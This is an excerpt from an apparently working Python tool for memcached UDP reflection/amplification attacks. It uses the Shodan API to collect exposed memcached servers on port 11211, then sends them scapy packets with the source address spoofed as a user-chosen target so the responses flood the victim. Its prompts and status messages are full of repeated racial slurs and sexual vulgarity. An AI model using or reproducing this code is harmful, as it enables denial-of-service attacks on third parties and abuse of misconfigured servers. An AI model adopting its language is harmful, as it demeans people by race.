...
if keys.is_file():
    ...
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Please enter a good valid key from shodan nigger ( key is provided in the communication server): ')
    file.write(SHODAN_API_KEY)
    print('[~] File written to nigges!!! ./api.txt')
    print("Ok bro file written now go f")
    file.close()

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('god is good !! x2')
    try:
        myresults = Path("./bots.txt")
        query = input("[*] Use Shodan API for affected memcached serverz!? <Y/n>: ").lower()
        if query.startswith('y'):
            print('')
            print('[~] Checking your key user: %s' % SHODAN_API_KEY)
            results = api.search('product:"Memcached" port:11211')
            print('[✓] API Key Authentication: SUCCESS stupid nigger')
            print('[~] Number of stupid niggas: %s' % results['total'])
            print('')
            saveresult = input("[*] Save results? <Y/n>: ").lower()
            print("Ok bro STOCKSEC is watching!")
            if saveresult.startswith('y'):
                ...
                print('')
                file2.close()
        saveme = input('[*] We found a local shodan data! <Y/n>: ').lower()
        ...
        if saveme.startswith('y') or query.startswith('y'):
            ...
            targetport = input("[▸] Enter target port number (Default 8080): ") or "8080"
            power = int(input("[▸] Enter preferred power (Default 5): ") or "5")
            print('')
            ...
            if saveme.startswith('y'):
                ...
                if iplistlocal.startswith('y'):
                    ...
                    for x in ip_array:
                        ...
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            print('')
            engage = input('[*] Ready to fuck the targer ( cumshot mode on!!! ) %s? <Y/n>: ' % target).lower()
                        ...
                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                            ...
                            if power>1:
                                ...
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                print('')
                print('[•] Task complete! Exiting Platform. Have a good day stocksec members.')
                break
            else:
                print('')
                print('[✘] Error: %s not engaged!' % target)
                print('[~] Restarting Platform! Please wait you incomptent nigger           .')
                print('')
        else:
            print('')
            print('[✘] Error: There aint no bots around here!')
            print('[~] Restarting Platform! Please wait you nigger.')
            print('')
